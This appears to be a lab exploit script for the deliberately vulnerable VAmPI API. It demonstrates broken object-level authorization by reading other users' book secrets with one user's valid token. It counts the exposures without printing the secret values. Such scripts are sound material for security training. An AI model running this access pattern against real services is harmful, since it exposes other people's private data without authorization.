#!/usr/bin/env python3
"""
vampi_challenge_03_bola_books.py — Broken Object Level Access on books.

GET /books/v1/{book_title} is documented as "only the owner may retrieve it",
but VAmPI never checks ownership. A legitimate user reads their OWN book
(baseline), then reads OTHER users' books with the same valid session. If the
foreign secrets come back, that's the BOLA pattern.

We deliberately do NOT print the secret values — only whether a foreign book's
secret was returned.
Run: python3 vampi_challenge_03_bola_books.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="BOLA on other users' book secrets")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    u = vc.known_users(cfg)[0]
    own = u["username"]

    token = vc.login(base, own, u["password"], vc.consumer_headers(803), tout)
    if not token:
        print("login failed, skipping")
        return
    h = vc.auth_headers(token)

    # Baseline: ensure the user has at least one OWN book, then read it.
    r = requests.get(f"{base}/books/v1", headers=h, timeout=tout)
    all_books = vc.as_list(r.json())
    mine = [b.get("book_title") for b in all_books if isinstance(b, dict) and b.get("user") == own]
    if mine:
        own_title = mine[0]
    else:
        own_title = vc.rand_book_title(own)
        requests.post(f"{base}/books/v1", json={"book_title": own_title, "secret": vc.rand_password()},
                      headers={**h, "Content-Type": "application/json"}, timeout=tout)

    r = requests.get(f"{base}/books/v1/{own_title}", headers=h, timeout=tout)
    own_has_secret = has_secret(r.json() if r.status_code != 204 else {})
    print(f"baseline  GET /books/v1/{own_title} (own) -> HTTP {r.status_code} secret_present={own_has_secret}")

    # BOLA: read books owned by OTHERS.
    foreign_titles = [b.get("book_title") for b in all_books
                      if isinstance(b, dict) and b.get("user") and b.get("user") != own]
    exposed = 0
    for title in foreign_titles:
        r = requests.get(f"{base}/books/v1/{title}", headers=h, timeout=tout)
        d = r.json() if r.status_code != 204 else {}
        leak = r.status_code == 200 and has_secret(d)
        if leak:
            exposed += 1
        print(f"bola      GET /books/v1/{title} (owner={b_owner(all_books, title)}) -> HTTP {r.status_code} {'[SECRET EXPOSED]' if leak else ''}")

    print(f"\nDone — {exposed} foreign book secret(s) readable by a non-owner token.")


def has_secret(d):
    """A book read returns either a dict {..,secret} or a list of such."""
    if isinstance(d, dict):
        return "secret" in d
    if isinstance(d, list) and d:
        return "secret" in d[0]
    return False


def b_owner(all_books, title):
    for b in all_books:
        if isinstance(b, dict) and b.get("book_title") == title:
            return b.get("user")
    return "?"


if __name__ == "__main__":
    main()
